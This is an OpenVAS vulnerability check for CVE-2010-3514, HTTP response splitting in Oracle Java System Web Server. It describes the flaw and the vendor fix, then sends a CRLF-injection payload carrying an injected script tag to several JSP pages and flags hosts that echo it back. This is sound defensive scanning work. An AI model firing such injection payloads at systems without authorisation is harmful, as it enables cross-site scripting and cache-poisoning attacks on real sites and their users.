###############################################################################
# OpenVAS Vulnerability Test
#
# Oracle Java System Web Server HTTP Response Splitting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801532");
  script_version("2019-05-16T07:41:50+0000");
  script_tag(name:"last_modification", value:"2019-05-16 07:41:50 +0000 (Thu, 16 May 2019)");
  script_tag(name:"creation_date", value:"2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)");
  script_cve_id("CVE-2010-3514");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Oracle Java System Web Server HTTP Response Splitting Vulnerability");
  script_xref(name:"URL", value:"http://inj3ct0r.com/exploits/14530");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15290/");
  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/topics/security/cpuoct2010-175626.html#AppendixSUNS");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("SunWWW/banner");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to conduct Cross Site
  Scripting and browser cache poisoning attacks.");

  script_tag(name:"affected", value:"Oracle Java System Web Server 6.x/7.x");

  script_tag(name:"insight", value:"The flaw is due to input validation error in 'response.setHeader()'
  method which is not properly sanitising before being returned to the user.
  This can be exploited to insert arbitrary HTTP headers, which will be
  included in a response sent to the user.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Apply the referenced vendor update.");

  script_tag(name:"summary", value:"The host is running Oracle Java System Web Server and is prone to
  HTTP response splitting vulnerability.");

  script_xref(name:"URL", value:"http://sunsolve.sun.com/search/document.do?assetkey=1-79-1215353.1-1");

  exit(0);
}

include("http_func.inc");

jswsPort = get_http_port(default:80);

banner = get_http_banner(port:jswsPort);
if(!banner || "Server: Sun-" >!< banner)
  exit(0);

host = http_host_name(port:jswsPort);

foreach files (make_list("login.jsp", "index.jsp", "default.jsp", "admin.jsp")) {

  url = string("/", files, "?ref=http://", host, "/%0D%0AContent-type:+text/html;%0D%0A%0D%0ATEST%3Cscript%3Ealert(111)%3C/script%3E");

  req = http_get(item:url, port:jswsPort);
  resp = http_send_recv(port: jswsPort, data: req);

  if(egrep(string:resp, pattern:"^HTTP/1\.[01] 200") &&
     ("TEST<script>alert(111)</script>" >< resp)) {
    report = report_vuln_url(port:jswsPort, url:url);
    security_message(port:jswsPort, data:report);
    exit(0);
  }
}
